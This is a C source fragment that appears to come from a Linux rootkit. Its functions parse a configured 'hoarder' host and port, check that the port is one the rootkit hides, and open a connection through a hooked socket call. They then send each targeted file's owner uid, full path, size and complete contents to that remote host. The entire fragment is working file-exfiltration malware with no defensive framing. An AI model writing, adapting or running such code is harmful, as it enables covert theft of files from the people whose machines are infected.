char *get_hoarder_host(const bdvcfg_t *bc){
    char *dupdup = strdup(bc->hoarder_host);
    if(!dupdup) return NULL;
    char *rv = strdup(strtok(dupdup, ":"));
    clean(dupdup);
    return rv;
}
u_short get_hoarder_port(const bdvcfg_t *bc){
    return (u_short)atoi(strchr(bc->hoarder_host,':')+1);
}
in_addr_t __attribute((visibility("hidden"))) get_hoarder_saddr(const bdvcfg_t *bc){
    char *hoarder_host = strdup(bc->hoarder_host);
    if(!hoarder_host) return 0;
    in_addr_t rv = inet_addr(strtok(hoarder_host, ":"));
    clean(hoarder_host);
    return rv;
}

typedef struct {
    uint32_t uid;
    uint32_t filesize;
    char filepath[PATH_MAX];
} fileinfo_t;
void sendfileinfo(const int sockfd, char *cwd, const char *oldpath, const u_long fsize){
    fileinfo_t file_struct;
    memset(&file_struct, 0, sizeof(fileinfo_t));
    file_struct.uid = htonl(getuid());
    file_struct.filesize = htonl(fsize);
    if(cwd != NULL){
        int pinfo = snprintf(file_struct.filepath, sizeof(file_struct.filepath)-1, "%s/%s", cwd, oldpath);
        if(pinfo <= 0) return;
    }else strncpy(file_struct.filepath, oldpath, sizeof(file_struct.filepath)-1);
    send(sockfd, &file_struct, sizeof(fileinfo_t), 0);
}

int prepare_hoarder_connection(void){
    if(!initmvbc()) return -1;

    u_short hoarder_port = get_hoarder_port(mvbc);
    if(hoarder_port == 0 || !is_hidden_port(hoarder_port))
        return -1;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    if((sa.sin_addr.s_addr = get_hoarder_saddr(mvbc)) == 0)
        return -1;
    sa.sin_port = htons(hoarder_port);

    int rv;
    hook(CSOCKET);
    if((rv = (long)call(CSOCKET, AF_INET, SOCK_STREAM, 0)) < 0)
        return -1;

    if(connect(rv, (struct sockaddr*)&sa, sizeof(sa)) < 0){
        int real_errno = errno;
        shutdown(rv, SHUT_RDWR);
        close(rv);
        errno = real_errno;
        return -1;
    }

    return rv;
}

int hoarder_sendfile(const char *oldpath, const int in_fd, const u_long fsize){
    if(!reinitmvbc() || *mvbc->hoarder_host == '\0')
        return -1;

    int sockfd = prepare_hoarder_connection();
    if(sockfd < 0) return -1;

    if(*oldpath != '/'){
        char cwd[PATH_MAX];
        if(getcwd(cwd, sizeof(cwd)-1) == NULL){
            shutdown(sockfd, SHUT_RDWR);
            close(sockfd);
            return -1;
        }else sendfileinfo(sockfd, cwd, oldpath, fsize);
    }else sendfileinfo(sockfd, NULL, oldpath, fsize);

    off_t offset = 0;
    sendfile(sockfd, in_fd, &offset, fsize);
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
    return 1;
}